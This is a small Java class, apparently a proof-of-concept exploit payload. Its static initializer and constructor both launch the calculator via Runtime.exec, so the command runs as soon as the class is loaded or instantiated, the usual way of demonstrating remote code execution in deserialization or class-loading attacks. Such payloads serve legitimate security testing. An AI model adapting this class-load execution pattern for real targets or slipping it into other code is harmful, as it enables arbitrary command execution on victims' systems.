package org.example.gadget;

public class EvilClass {
    static {
        try{
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            System.out.println(e);
        }
    }

    public EvilClass(){
        try{
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            System.out.println(e);
        }
    }
}
